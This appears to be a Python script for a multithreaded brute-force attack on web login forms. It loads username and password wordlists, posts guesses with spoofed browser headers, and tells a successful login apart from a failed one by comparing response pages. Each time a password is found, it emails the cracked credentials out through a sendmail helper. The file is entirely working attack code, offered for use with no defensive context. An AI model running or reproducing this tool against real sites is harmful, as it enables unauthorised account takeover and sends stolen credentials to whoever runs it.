import comparepage
from constants import headers
from initpara import *
import queue
import threading
import sys
import requests
import time
from sendmail import sendmail
headers= {
            'Accept-Encoding': 'gzip, deflate, sdch',
            'Accept-Language': 'zh-CN,zh;q=0.8',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36'
                           ' (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36'),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded'}

class brute_thread(threading.Thread):
    def __init__(self,ThreadID,queue,url,username,wrong_page,para_dict,pass_name):
        threading.Thread.__init__(self)
        self.threadID=ThreadID
        self.queue=queue
        self.lock=threading.Lock()
        self.url=url
        self.wrong_page=wrong_page
        self.username=username
        self.para_dict=para_dict
        self.pass_name=pass_name
        self.flag=0

    def setflag(self):
        self.flag=1

    def run(self):
        print("start thread: "+str(self.threadID))
        self.brute()
        print('thread end: '+str(self.threadID))

    def brute(self):
        while not self.flag:
            self.lock.acquire()
            if not self.queue.empty():
                password = self.queue.get()
                self.lock.release()
                print('Thread ', self.threadID, 'is trying username: ', self.username, 'with password: ', password)
                postdata=init_postdata(self.url,self.username,password,self.para_dict,self.pass_name)
                # print(postdata,self.threadID)
                if not try_pass(self.url,headers,postdata,self.wrong_page):
                    print('pass info is :', postdata)
                    sendmail('username: '+self.username+' password:'+password)
                    self.setflag()
            else:
                self.lock.release()
            time.sleep(0.1)
        print('Have not found any password in thread: ',self.threadID)

def get_fileinfo_inlist(userfile,passfile):
    user_file=open(userfile,'r')
    pass_file=open(passfile,'r')
    user_list=[username.strip() for username in user_file.readlines()]
    pass_list=[password.strip() for password in pass_file.readlines()]
    user_file.close()
    pass_file.close()
    return user_list,pass_list

def list_to_queue(list):
    newqueue = queue.Queue()
    queuelock = threading.Lock()
    queuelock.acquire()
    for i in list:
        newqueue.put(i)
        # print(i)
    queuelock.release()
    return newqueue

def exploit(url,userfile,passfile,thread_num):
    user_list,pass_list=get_fileinfo_inlist(userfile,passfile)
    wrong_page = init_wrongpage(url)
    para_dict,pass_name=init_para(url)
    for username in user_list:
        print('trying username:',username)
        pass_queue=list_to_queue(pass_list)
        thread_list=[]
        for i in range(thread_num):
            thread = brute_thread(i,pass_queue,url,username,wrong_page,para_dict,pass_name)
            thread_list.append(thread)
        for thread in thread_list:
            thread.start()
        while not pass_queue.empty():
            pass
        for thread in thread_list:
            thread.setflag()
            thread.join()
    print('over')


def try_pass(url,headers,postdata,wrongpage):
    tryrequest = requests.post(url=url, headers=headers, data=postdata)
    # print(postdata,ID)
    # print(tryrequest.text)
    return comparepage.compare_page(wrongpage.text, tryrequest.text)
